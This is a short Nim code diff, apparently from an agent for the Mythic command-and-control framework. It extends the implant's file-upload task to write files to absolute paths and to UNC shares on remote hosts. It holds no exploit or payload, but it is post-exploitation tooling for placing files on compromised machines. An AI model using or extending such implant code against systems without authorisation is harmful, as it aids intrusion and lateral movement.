@@ -1,4 +1,4 @@
-import json, os, base64
+import json, os, base64, strutils
 
 const CHUNK_SIZE = 512000  # 512KB chunks
 
@@ -7,6 +7,7 @@ type
     file: string
     remote_path: string
     file_name: string
+    host: string  # Optional host for UNC paths
 
 proc executeUpload*(taskId: string, params: JsonNode): JsonNode =
   ## Upload a file from Mythic to the target system
@@ -14,8 +15,20 @@ proc executeUpload*(taskId: string, params: JsonNode): JsonNode =
   
   try:
     let args = to(params, UploadArgs)
-    let cwd = getCurrentDir()
-    let filePath = cwd / args.remote_path
+    
+    # Build UNC path if host is provided
+    var filePath: string
+    if args.host.len > 0:
+      # Remove leading/trailing backslashes from path
+      var cleanPath = args.remote_path.strip(chars = {'\\', '/'})
+      # Build UNC path: \\host\share
+      filePath = "\\\\" & args.host & "\\" & cleanPath
+    elif args.remote_path.startsWith("\\\\") or isAbsolute(args.remote_path):
+      # Already UNC or absolute path
+      filePath = args.remote_path
+    else:
+      # Relative path - join with current directory
+      filePath = getCurrentDir() / args.remote_path
     
     # Check if file already exists
     if fileExists(filePath):
@@ -51,8 +64,11 @@ proc processUploadChunk*(taskId: string, fileId: string, path: string, chunkNum:
   ## Appends to file and requests next chunk if needed
   
   try:
-    let cwd = getCurrentDir()
-    let filePath = cwd / path
+    # Handle UNC paths and absolute paths - don't join with cwd
+    let filePath = if path.startsWith("\\\\") or isAbsolute(path):
+      path
+    else:
+      getCurrentDir() / path
     
     # Decode the chunk
     let decodedData = decode(chunkData)
